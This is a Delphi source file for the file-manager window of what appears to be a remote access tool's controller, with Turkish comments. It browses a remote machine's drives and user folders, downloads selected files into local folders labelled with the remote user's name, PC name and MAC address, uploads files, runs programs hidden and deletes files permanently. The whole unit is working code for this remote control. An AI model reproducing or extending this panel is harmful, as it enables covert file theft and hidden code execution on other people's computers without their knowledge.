unit ClientFileManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, ImgList, ComCtrls, ToolWin, Menus, StdCtrls, ExtCtrls, CommCtrl,
  Dialogs, ShellApi, uTypes, uSockets, uFunctions;

type
  TFileManagerForm = class(TCForm)
    ToolBar1: TToolBar;
    BackDir: TToolButton;
    ImageList: TImageList;
    FileAction: TPopupMenu;
    DelHard: TMenuItem;
    FileRename: TMenuItem;
    DosyaAl1: TMenuItem;
    FileCutPaste: TMenuItem;
    FileCopy: TMenuItem;
    FilePaste: TMenuItem;
    N1: TMenuItem;
    N2: TMenuItem;
    GetDrives: TToolButton;
    Panel1: TPanel;
    CurDir: TMemo;
    FileList: TListView;
    ToolButton1: TToolButton;
    GetDesktop: TToolButton;
    GetUserDir: TToolButton;
    FileRefresh: TToolButton;
    DelNormal: TMenuItem;
    DosyaGnder1: TMenuItem;
    RunProcess: TMenuItem;
    N3: TMenuItem;
    OD: TOpenDialog;
    ToolButton3: TToolButton;
    OpenStorageDir: TToolButton;
    FileInfo: TMenuItem;
    N4: TMenuItem;
    Yeni1: TMenuItem;
    NewFolder: TMenuItem;
    NewFile: TMenuItem;
    RunNormal: TMenuItem;
    RunHidden: TMenuItem;
    ProgressBar: TProgressBar;
    Status: TStatusBar;
    Sil1: TMenuItem;
    Yaptr1: TMenuItem;
    EditNotepad: TMenuItem;
    procedure GetDrivesClick(Sender: TObject);
    procedure GetDesktopClick(Sender: TObject);
    procedure GetUserDirClick(Sender: TObject);
    procedure BackDirClick(Sender: TObject);
    procedure FileListDblClick(Sender: TObject);
    procedure DosyaAl1Click(Sender: TObject);
    procedure DelHardClick(Sender: TObject);
    procedure FileRefreshClick(Sender: TObject);
    procedure DelNormalClick(Sender: TObject);
    procedure DosyaGnder1Click(Sender: TObject);
    procedure FileCopyClick(Sender: TObject);
    procedure FileCutPasteClick(Sender: TObject);
    procedure FilePasteClick(Sender: TObject);
    procedure FileRenameClick(Sender: TObject);
    procedure OpenStorageDirClick(Sender: TObject);
    procedure FileInfoClick(Sender: TObject);
    procedure NewFolderClick(Sender: TObject);
    procedure NewFileClick(Sender: TObject);
    procedure RunNormalClick(Sender: TObject);
    procedure RunHiddenClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormResize(Sender: TObject);
    procedure FileListKeyPress(Sender: TObject; var Key: Char);
    procedure EditNotepadClick(Sender: TObject);
  private
    function CreateRecvFilePath(ClientData: TObject; Path: string): string;
    function FormatByteSize(const bytes: Longint): string;
    procedure ListAddFiles(SL: TStringList);
    procedure ListAddDrives(SL: TStringList);
  public
    procedure ExecuteThread(CMD: string = ''); override;
    procedure OpenView();
  end;

implementation

uses
  ClientPreview, ClientNotepad;

var
  PreviewForm : TPreviewForm;

{$R *.dfm}

procedure TFileManagerForm.FormCreate(Sender: TObject);
var
  R: TRect;
begin
  SendMessage(Status.Handle, SB_GETRECT, 1, LPARAM(@R));
  ProgressBar.Parent := Status;
  ProgressBar.SetBounds(Status.Width - 200, 0, 200, Status.Height);

  // Create Preview Form
  PreviewForm := TPreviewForm.Create(Owner);
  PreviewForm.Show;
  PreviewForm.Hide;
end;

procedure TFileManagerForm.FormResize(Sender: TObject);
begin
  ProgressBar.SetBounds(Status.Width - 200, 0, 200, Status.Height);
end;

procedure TFileManagerForm.OpenView();
begin

end;

procedure TFileManagerForm.ExecuteThread(CMD: string = '');
var
  MS: TMemoryStream;
  SL: TStringList;
  Size, Count, i: Integer;
  FS: TFileStream;
  Path: string;
begin
  MS := TMemoryStream.Create;
  SL := TStringList.Create;

  if CMD = 'fm_disklist' then begin
    CurDir.Text := '';
    Size := Client.ReadInteger;
    Client.ReadStream(MS, Size);
    SL.LoadFromStream(MS);
    ListAddDrives(SL);
  end;

  if POS(CMD, '|fm_desktop|fm_userdir') > 0 then begin
    CurDir.Text := Client.ReadLn;
    Size := Client.ReadInteger;
    Client.ReadStream(MS, Size);
    SL.LoadFromStream(MS);
    ListAddFiles(SL);
  end;

  if CMD = 'fm_listdir' then begin
    CurDir.Text := Client.ReadLn;
    Size := Client.ReadInteger;
    Client.ReadStream(MS, Size);
    SL.LoadFromStream(MS);
    ListAddFiles(SL);
  end;

  if CMD = 'fm_filerecv' then begin
    Count := Client.ReadInteger;
    for i := 0 to Count - 1 do begin
      Path := CreateRecvFilePath(Client.Data, Client.ReadLn);
      FS := TFileStream.Create(Path, fmCreate or fmOpenWrite and fmShareDenyWrite);
      Size := Client.ReadInteger;
      Client.ReadStream(FS, Size, ProgressBar);
      FS.Free;
      FS := nil;
      Client.WriteLn('Done');
    end;
  end;

  if CMD = 'fm_fileinfo' then begin
    Size := Client.ReadInteger;
    Client.ReadStream(MS, Size);
    SL.LoadFromStream(MS);
    MessageBox(0, PChar(SL.Text), 'Özellikler', MB_OK);
  end;

  if CMD = 'fm_viewimage' then begin
    Size := Client.ReadInteger;
    Client.ReadStream(MS, Size);
    PreviewForm.ViewImage(MS);
    PreviewForm.Left := Self.Left;
    PreviewForm.Top := Self.Top;
    PreviewForm.Show;
    SetForegroundWindow(PreviewForm.Handle);
  end;

  if CMD = 'fm_viewtext' then begin
    Size := Client.ReadInteger;
    Client.ReadStream(MS, Size);
    SL.LoadFromStream(MS);
    PreviewForm.ViewText(SL);
    PreviewForm.Left := Self.Left;
    PreviewForm.Top := Self.Top;
    PreviewForm.Show;
    SetForegroundWindow(PreviewForm.Handle);
  end;

  if POS(CMD, '|fm_editnotepad|fm_editnotepadsave') > 0 then begin
    ExecuteThreadForm(TClientNotepadForm, 'NOTEPAD', Client, CMD);
  end;

  SL.Free;
  MS.Free;
end;

{****************************************************************************
                              Private Functions
****************************************************************************}

function TFileManagerForm.CreateRecvFilePath(ClientData: TObject; Path: string): string;
begin
  Path := StringReplace(Path, IncludeTrailingPathDelimiter(CurDir.Text), '', [rfReplaceAll]);

  with TClientData(ClientData) do begin
    Result := Format('%sClientData\%s-%s-%s\%s', [IncludeTrailingPathDelimiter(ExtractFilePath(ParamStr(0))), Username, PCName, MacAddr, Path]);
  end;

  if not DirectoryExists(ExtractFilePath(Result)) then
    ForceDirectories(ExtractFilePath(Result));
end;

function TFileManagerForm.FormatByteSize(const Bytes: Longint): string;
const
  B = 1; //byte
  KB = 1024 * B; //kilobyte
  MB = 1024 * KB; //megabyte
  GB = 1024 * MB; //gigabyte
begin
  if Bytes <> 0 then begin
    if Bytes > GB then Result := FormatFloat('#.## GB', bytes / GB)
    else if Bytes > MB then Result := FormatFloat('#.## MB', bytes / MB)
    else if Bytes > KB then Result := FormatFloat('#.## KB', bytes / KB)
    else Result := FormatFloat('#.## bytes', bytes);
  end else
    Result := '';
end;

procedure TFileManagerForm.ListAddFiles(SL: TStringList);
var
  i: Integer;
begin
  FileList.Clear;

  for i := 0 to SL.Count do begin
    if (i mod 3 = 0) and (i < SL.Count - 2) then
      with FileList.Items.Add do begin
        Caption := '';
        SubItems.Insert(0, SL.Strings[i]);
        SubItems.Insert(1, SL.Strings[i + 1]);

        if SL.Strings[i + 2] <> '' then
          SubItems.Insert(2, FormatByteSize(StrToInt64(SL.Strings[i + 2])))
        else
          SubItems.Insert(2, '');

        if SL.Strings[i + 1] = 'Directory' then ImageIndex := 12
        else if SL.Strings[i + 1] = '.lnk' then ImageIndex := 9
        else if SL.Strings[i + 1] = '.exe' then ImageIndex := 9
        else if SL.Strings[i + 1] = '.zip' then ImageIndex := 10
        else if SL.Strings[i + 1] = '.rar' then ImageIndex := 11
        else if SL.Strings[i + 1] = '.txt' then ImageIndex := 14
        else if SL.Strings[i + 1] = '.docm' then ImageIndex := 15
        else if SL.Strings[i + 1] = '.docx' then ImageIndex := 16
        else if SL.Strings[i + 1] = '.doc' then ImageIndex := 16
        else if SL.Strings[i + 1] = '.pdf' then ImageIndex := 17
        else if SL.Strings[i + 1] = '.pptm' then ImageIndex := 18
        else if SL.Strings[i + 1] = '.pptx' then ImageIndex := 19
        else if SL.Strings[i + 1] = '.xlsm' then ImageIndex := 20
        else if SL.Strings[i + 1] = '.xlsx' then ImageIndex := 21
        else if SL.Strings[i + 1] = '.exe' then ImageIndex := 22
        else if SL.Strings[i + 1] = '.cmd' then ImageIndex := 23
        else if SL.Strings[i + 1] = '.bat' then ImageIndex := 23
        else if SL.Strings[i + 1] = '.msi' then ImageIndex := 24
        else if SL.Strings[i + 1] = '.ini' then ImageIndex := 27
        else if SL.Strings[i + 1] = '.dll' then ImageIndex := 25
        else if SL.Strings[i + 1] = '.xml' then ImageIndex := 28
        else if SL.Strings[i + 1] = '.mpeg' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.mpeg2' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.mpeg4' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.avi' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.mov' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.flv' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.wmv' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.vob' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.3gp' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.mkv' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.swf' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.mkv' then ImageIndex := 29
        else if SL.Strings[i + 1] = '.jpg' then ImageIndex := 26
        else if SL.Strings[i + 1] = '.jpeg' then ImageIndex := 26
        else if SL.Strings[i + 1] = '.png' then ImageIndex := 26
        else if SL.Strings[i + 1] = '.bmp' then ImageIndex := 26
        else if SL.Strings[i + 1] = '.gif' then ImageIndex := 26
        else ImageIndex := 13;
      end;
  end;
end;

procedure TFileManagerForm.ListAddDrives(SL: TStringList);
var
  i: Integer;
begin
  FileList.Clear;

  for i := 0 to SL.Count do begin
    if (i mod 2 = 0) and (i < SL.Count - 1) then
      with FileList.Items.Add do begin
        Caption := '';
        ImageIndex := 1;
        SubItems.Insert(0, SL.Strings[i]);
        SubItems.Insert(1, SL.Strings[i + 1]);
      end;
  end;
end;

{****************************************************************************
                      File Manager -> Baþlangýç
****************************************************************************}

procedure TFileManagerForm.BackDirClick(Sender: TObject);
begin
  if CurDir.Text <> '' then begin
    if (ExtractFileDir(CurDir.Text) <> CurDir.Text) then begin
      Client.WriteLn('fm_listdir');
      Client.WriteLn(ExtractFileDir(CurDir.Text));
    end else
      GetDrivesClick(Self);
  end;
end; {* Back Button -> Bir Üst Dizini Listeler *}

procedure TFileManagerForm.FileRefreshClick(Sender: TObject);
begin
  if CurDir.Text <> '' then begin
    Client.WriteLn('fm_listdir');
    Client.WriteLn(CurDir.Text);
  end else
    GetDrivesClick(Self);
end; {* Refresh Button -> Listeyi Yenile *}

procedure TFileManagerForm.GetDesktopClick(Sender: TObject);
begin
  Client.WriteLn('fm_desktop');
end; {* List Desktop Button -> Masaüstü Dizin Listesini AL *}

procedure TFileManagerForm.GetUserDirClick(Sender: TObject);
begin
  Client.WriteLn('fm_userdir');
end; {* List User Button -> Kullanýcý Dizin Listesini Al *}

procedure TFileManagerForm.GetDrivesClick(Sender: TObject);
begin
  Client.WriteLn('fm_disklist');
end; {* List Disk Button -> Sürücü Listesini Alýr *}

procedure TFileManagerForm.OpenStorageDirClick(Sender: TObject);
var
  Path : String;
begin
  with TClientData(Client.Data) do begin
    Path := Format('%sClientData\%s-%s-%s', [IncludeTrailingPathDelimiter(ExtractFilePath(ParamStr(0))), Username, PCName, MacAddr]);
    if DirectoryExists(Path) then
      ShellExecute(Application.Handle, 'open', 'explorer.exe', PChar(Path), nil, SW_NORMAL);
  end;
end; { OpenStorageDirClick -> Kayýt Klasörünü Gösterir }

procedure TFileManagerForm.FileListDblClick(Sender: TObject);
var
  Path, FType: string;
begin
  FType := FileList.Selected.SubItems.Strings[1];
  if (FType = 'Directory') or (FType = 'Removable') or (FType = 'Fixed') or (FType = 'Remote (network)') or (FType = 'CD-ROM') or (FType = 'RAM disk') then
  begin
    if CurDir.Text <> '' then CurDir.Text := IncludeTrailingPathDelimiter(CurDir.Text);

    Client.WriteLn('fm_listdir');
    Client.WriteLn(CurDir.Text + FileList.Selected.SubItems.Strings[0]);
  end;
end; {* FileListDblClick -> Dizine Çift Týklama *}

procedure TFileManagerForm.DosyaAl1Click(Sender: TObject);
var
  LI: TListItem;
  FL: TStringList;
  MS: TMemoryStream;
begin
  if FileList.SelCount > 0 then begin
    FL := TStringList.Create;
    MS := TMemoryStream.Create;

    // Create Recv File List
    LI := FileList.GetNextItem(Li, sdAll, [isSelected]);
    while LI <> nil do begin
      FL.Add(IncludeTrailingPathDelimiter(CurDir.Text) + Li.SubItems.Strings[0]);
      if FileList.SelCount > 1 then
        Li := FileList.GetNextItem(Li, sdAll, [isSelected])
      else
        Break;
    end;
    FL.SaveToStream(MS);
    FL.Free;

    // Send Stream
    Client.WriteLn('fm_filerecv');
    Client.WriteInteger(MS.Size);
    Client.WriteStream(MS);
  end;
end; { DosyaAl1Click -> Dosya Al }

procedure TFileManagerForm.DosyaGnder1Click(Sender: TObject);
var
  FS: TFileStream;
  i : Integer;
begin
  if OD.Execute then begin
    if OD.Files.Count > 0 then begin
      Client.WriteLn('fm_filesend');
      Client.WriteInteger(OD.Files.Count);

      for i := 0 to OD.Files.Count - 1 do begin
        FS := TFileStream.Create(OD.Files[i], fmOpenRead);
        Client.WriteLn(IncludeTrailingPathDelimiter(CurDir.Text) + ExtractFileName(OD.Files[i]));
        Client.WriteInteger(FS.Size);
        Client.WriteStream(FS);
        Client.WriteLn('DONE');
      end;
    end;
  end;
end; { DosyaGnder1Click -> Dosya Gönder }

procedure TFileManagerForm.EditNotepadClick(Sender: TObject);
begin
  if (FileList.SelCount > 0) and (CurDir.Text <> '') then begin
    ShowClientProcessForm(Application, TClientNotepadForm, 'NOTEPAD', Client);
    Client.WriteLn('fm_editnotepad');
    Client.WriteLn(IncludeTrailingPathDelimiter(CurDir.Text) + FileList.Selected.SubItems.Strings[0]);
  end;
end; { EditNotepadClick -> Dosya Düzenle }

procedure TFileManagerForm.RunNormalClick(Sender: TObject);
var
  i, x: integer;
  Path: string;
begin
  if FileList.SelCount > 0 then begin
    Path := IncludeTrailingPathDelimiter(CurDir.Text) + FileList.Selected.SubItems.Strings[0];
    Client.WriteLn('fm_filerun');
    Client.WriteLn(Path);
  end;
end; { RunNormalClick -> Dosya Çalýþtýrýr }

procedure TFileManagerForm.RunHiddenClick(Sender: TObject);
var
  i, x: integer;
  Path: string;
begin
  if FileList.SelCount > 0 then begin
    Path := IncludeTrailingPathDelimiter(CurDir.Text) + FileList.Selected.SubItems.Strings[0];
    Client.WriteLn('fm_filerunhidden');
    Client.WriteLn(Path);
  end;
end; { RunNormalClick -> Dosyayý Gizli olarak Çalýþtýrýr }

var
  CopyList: TStringList;
procedure TFileManagerForm.FileCopyClick(Sender: TObject);
var
  LI : TListItem;
begin
  if FileList.SelCount > 0 then begin
    // Create List
    if not Assigned(CopyList) then
      CopyList := TStringList.Create
    else
      CopyList.Clear;

    // Create Recv File List
    LI := FileList.GetNextItem(Li, sdAll, [isSelected]);
    while LI <> nil do begin
      CopyList.Add(IncludeTrailingPathDelimiter(CurDir.Text) + Li.SubItems.Strings[0]);
      if FileList.SelCount > 1 then
        Li := FileList.GetNextItem(Li, sdAll, [isSelected])
      else
        Break;
    end;

    // Enable Paste Button
    FilePaste.Enabled := True;
    FileCutPaste.Enabled := True;
  end;
end; { FileCopyClick -> Dosya Çalýþtýrýr }

procedure TFileManagerForm.FileCutPasteClick(Sender: TObject);
var
  MS: TMemoryStream;
begin
  // Convert Stream
  MS := TMemoryStream.Create;
  CopyList.SaveToStream(MS);

  // Send
  Client.WriteLn('fm_filecut');
  Client.WriteInteger(MS.Size);
  Client.WriteStream(MS);
  Client.WriteLn(CurDir.Text);

  // Disable Button
  FilePaste.Enabled := False;
  FileCutPaste.Enabled := False;

  CopyList.Free;
  CopyList := nil;
end; { FileCutPasteClick -> Dosya Çalýþtýrýr }

procedure TFileManagerForm.FilePasteClick(Sender: TObject);
var
  MS: TMemoryStream;
begin
  // Convert Stream
  MS := TMemoryStream.Create;
  CopyList.SaveToStream(MS);

  // Send
  Client.WriteLn('fm_filecopy');
  Client.WriteInteger(MS.Size);
  Client.WriteStream(MS);
  Client.WriteLn(CurDir.Text);
end; { FilePasteClick -> Dosya Çalýþtýrýr }

procedure TFileManagerForm.FileRenameClick(Sender: TObject);
var
  NewName,OldFile : String;
begin
  if FileList.SelCount > 0 then begin
    OldFile := IncludeTrailingPathDelimiter(CurDir.Text) + FileList.Selected.SubItems.Strings[0];
    NewName := InputBox('Dosya Adlandýr', 'Lütfen yeni dosya adýný giriniz.', '');
    if NewName <> '' then begin
      Client.WriteLn('fm_filerename');
      Client.WriteLn(OldFile);
      Client.WriteLn(NewName);
    end;
  end;
end; { FileRenameClick -> Dosya & Dizin Adýný Deðiþtir }

procedure TFileManagerForm.DelNormalClick(Sender: TObject);
var
  LI: TListItem;
  FL: TStringList;
  MS: TMemoryStream;
begin
  if FileList.SelCount > 0 then begin
    FL := TStringList.Create;
    MS := TMemoryStream.Create;

    // Create Recv File List
    LI := FileList.GetNextItem(Li, sdAll, [isSelected]);
    while LI <> nil do begin
      FL.Add(IncludeTrailingPathDelimiter(CurDir.Text) + Li.SubItems.Strings[0]);
      if FileList.SelCount > 1 then
        Li := FileList.GetNextItem(Li, sdAll, [isSelected])
      else
        Break;
    end;
    FL.SaveToStream(MS);
    FL.Free;

    // Send Stream
    Client.WriteLn('fm_filedelete');
    Client.WriteInteger(MS.Size);
    Client.WriteStream(MS);
  end;
end; { FileRenameClick -> Dosya & Dizin Normal Sil }

procedure TFileManagerForm.DelHardClick(Sender: TObject);
var
  LI: TListItem;
  FL: TStringList;
  MS: TMemoryStream;
begin
  if FileList.SelCount > 0 then begin
    FL := TStringList.Create;
    MS := TMemoryStream.Create;

    // Create Recv File List
    LI := FileList.GetNextItem(Li, sdAll, [isSelected]);
    while LI <> nil do begin
      FL.Add(IncludeTrailingPathDelimiter(CurDir.Text) + Li.SubItems.Strings[0]);
      if FileList.SelCount > 1 then
        Li := FileList.GetNextItem(Li, sdAll, [isSelected])
      else
        Break;
    end;
    FL.SaveToStream(MS);
    FL.Free;

    // Send Stream
    Client.WriteLn('fm_filedeletehard');
    Client.WriteInteger(MS.Size);
    Client.WriteStream(MS);
  end;
end; { FileRenameClick -> Dosya & Dizin Diskten Sil }

procedure TFileManagerForm.NewFolderClick(Sender: TObject);
var
  Name, Path: String;
begin
  if CurDir.Text <> '' then begin
    Name := InputBox('Yeni Klasör', 'Yeni klasörün adýný girin.', '');
    if Name <> '' then begin
      Path := IncludeTrailingPathDelimiter(CurDir.Text) + Name;
      Client.WriteLn('fm_filecreatedir');
      Client.WriteLn(Path);
    end;
  end;
end; { NewFolderClick -> Yeni Klasör Oluþturur }

procedure TFileManagerForm.NewFileClick(Sender: TObject);
var
  Name, Path: String;
begin
  if CurDir.Text <> '' then begin
    Name := InputBox('Yeni Dosya', 'Yeni klasörün adýný uzantýsý ile birlikte girin.', '');
    if Name <> '' then begin
      Path := IncludeTrailingPathDelimiter(CurDir.Text) + Name;
      Client.WriteLn('fm_filecreatefile');
      Client.WriteLn(Path);
    end;
  end;
end; { NewFileClick -> Yeni Dosya Oluþturur }

procedure TFileManagerForm.FileInfoClick(Sender: TObject);
var
  Path: String;
begin
  if FileList.SelCount > 0 then begin
    Path := IncludeTrailingPathDelimiter(CurDir.Text) + FileList.Selected.SubItems.Strings[0];
    Client.WriteLn('fm_fileinfo');
    Client.WriteLn(Path);
  end;
end; { FileInfoClick -> Dosya & Dizin Özelliklerini Görüntüler }

procedure TFileManagerForm.FileListKeyPress(Sender: TObject; var Key: Char);
var
  Ext : String;
begin
  if Ord(Key) = VK_SPACE then
    if (FileList.SelCount = 1) and (CurDir.Text <> '') then begin
      Ext := ExtractFileExt(FileList.Selected.SubItems.Strings[0]);
      if Pos(Ext, '|.jpg|.jpeg|.bmp') > 0 then begin
        Client.WriteLn('fm_viewimage');
        Client.WriteLn(IncludeTrailingPathDelimiter(CurDir.Text) + FileList.Selected.SubItems.Strings[0]);
      end else
      if Pos (Ext, '|.txt|.bat|.cmd|.log|') > 0 then begin
        Client.WriteLn('fm_viewtext');
        Client.WriteLn(IncludeTrailingPathDelimiter(CurDir.Text) + FileList.Selected.SubItems.Strings[0]);
      end;
    end;
end;

end.

